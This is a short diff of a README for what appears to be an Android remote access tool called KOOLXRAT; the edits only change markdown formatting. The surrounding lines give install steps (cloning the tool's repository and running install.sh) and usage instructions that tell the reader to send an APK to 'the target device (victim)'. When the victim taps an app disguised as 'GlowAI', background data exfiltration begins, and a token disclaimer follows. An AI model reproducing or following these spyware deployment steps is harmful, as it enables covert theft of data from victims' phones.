@@ -28,7 +28,7 @@ git clone https://github.com/koolefx/KOOLXRAT-data.git
 cd KOOLXRAT-data
 chmod +x install.sh
 ./install.sh
-
+```
 🧪 How to Use
 Send the APK to the target device (victim).
 
@@ -45,9 +45,7 @@ Once installed, the victim taps GlowAI, and data exfiltration begins in the back
 
 ❗ Unauthorized use for malicious purposes is strictly discouraged.
 
-yaml
-Copy
-Edit
+
 
 
 # App Frontend
